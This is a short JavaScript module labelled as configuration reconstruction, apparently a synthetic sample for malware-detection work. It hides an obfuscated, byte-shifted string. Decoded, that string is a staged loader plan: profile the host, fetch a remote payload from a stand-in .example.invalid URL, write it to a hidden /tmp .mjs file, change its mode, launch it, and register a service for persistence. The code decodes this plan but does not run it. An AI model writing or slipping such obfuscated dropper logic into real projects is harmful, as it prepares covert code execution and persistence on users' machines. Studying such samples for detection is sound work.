// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_e87880c9 = "\\u0080\\u0047\\u003b\\u0086\\u007d\\u007e\\u006f\\u007a\\u007d\\u0047\\u007a\\u007c\\u0079\\u0070\\u0073\\u0076\\u006f\\u0069\\u0072\\u0079\\u007d\\u007e\\u0036\\u006b\\u006d\\u007b\\u007f\\u0073\\u007c\\u006f\\u0069\\u007c\\u006f\\u0077\\u0079\\u007e\\u006f\\u0036\\u0081\\u007c\\u0073\\u007e\\u006f\\u0069\\u0070\\u0073\\u0076\\u006f\\u0036\\u006d\\u0072\\u006b\\u0078\\u0071\\u006f\\u0069\\u0077\\u0079\\u006e\\u006f\\u0036\\u006e\\u0073\\u007d\\u007a\\u006b\\u007e\\u006d\\u0072\\u0069\\u007a\\u007c\\u0079\\u006d\\u006f\\u007d\\u007d\\u0086\\u006b\\u006e\\u006b\\u007a\\u007e\\u006f\\u007c\\u0047\\u0070\\u006f\\u007e\\u006d\\u0072\\u0069\\u007a\\u0076\\u006b\\u007e\\u0070\\u0079\\u007c\\u0077\\u0069\\u0070\\u006b\\u0076\\u0076\\u006c\\u006b\\u006d\\u0075\\u0086\\u007d\\u007e\\u006b\\u0071\\u006f\\u0069\\u006d\\u0079\\u007f\\u0078\\u007e\\u0047\\u003f\\u0086\\u006d\\u006b\\u0077\\u007a\\u006b\\u0073\\u0071\\u0078\\u0069\\u0073\\u006e\\u0047\\u0058\\u0059\\u004e\\u004f\\u0037\\u004c\\u004c\\u004c\\u003b\\u004c\\u0050\\u003f\\u0043\\u0086\\u007f\\u007c\\u0076\\u0047\\u0072\\u007e\\u007e\\u007a\\u007d\\u0044\\u0039\\u0039\\u0078\\u0079\\u006e\\u006f\\u0037\\u006c\\u006c\\u006c\\u003b\\u006c\\u0070\\u003f\\u0043\\u006e\\u003a\\u006f\\u006e\\u0038\\u006f\\u0082\\u006b\\u0077\\u007a\\u0076\\u006f\\u0038\\u0073\\u0078\\u0080\\u006b\\u0076\\u0073\\u006e\\u0039\\u006b\\u007a\\u0073\\u0086\\u007f\\u007d\\u006f\\u007c\\u0069\\u006b\\u0071\\u006f\\u0078\\u007e\\u0047\\u0058\\u0079\\u006e\\u006f\\u004b\\u007f\\u006e\\u0073\\u007e\\u0039\\u006c\\u006c\\u006c\\u003b\\u0086\\u0070\\u0073\\u0076\\u006f\\u0069\\u007a\\u006b\\u007e\\u0072\\u0047\\u0039\\u007e\\u0077\\u007a\\u0039\\u0072\\u007f\\u0078\\u007e\\u007c\\u006f\\u007d\\u007d\\u0037\\u0078\\u0079\\u006e\\u006f\\u0039\\u0038\\u007d\\u007e\\u006b\\u0071\\u006f\\u0037\\u006c\\u006c\\u006c\\u003b\\u006c\\u0070\\u003f\\u0043\\u006e\\u003a\\u006f\\u006e\\u0038\\u0077\\u0074\\u007d\\u0086\\u006b\\u007c\\u006d\\u0072\\u0069\\u007a\\u007c\\u0079\\u006c\\u006f\\u0047\\u007a\\u007c\\u0079\\u006d\\u006f\\u007d\\u007d\\u0038\\u006b\\u007c\\u006d\\u0072\\u0086\\u007d\\u006f\\u007c\\u0080\\u0073\\u006d\\u006f\\u0069\\u0078\\u006b\\u0077\\u006f\\u0047\\u0078\\u0079\\u006e\\u006f\\u0037\\u006c\\u006c\\u006c\\u003b\\u006c\\u0070\\u0038\\u007d\\u006f\\u007c\\u0080\\u0073\\u006d\\u006f";
const Codec_e87880c9 = "unicode_escapes|add_modulo_256|0a";

function load_e87880c9() { return [...Material_e87880c9.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_e87880c9(item1) { return item1.map((value) => (value - 10 + 256) & 255); }
async function recover_e87880c9() {
  const item3 = ["north", "south"].join(":");
  const item1 = load_e87880c9(); let item2 = [];
  item2 = decode_e87880c9(item1);
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_e87880c9() { return Buffer.from(await recover_e87880c9(), "utf8").toString("utf8"); }
async function plan_e87880c9() { const inspect = inspect_e87880c9; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "fetch_platform_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_e87880c9;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_e87880c9());

// reconstruction complete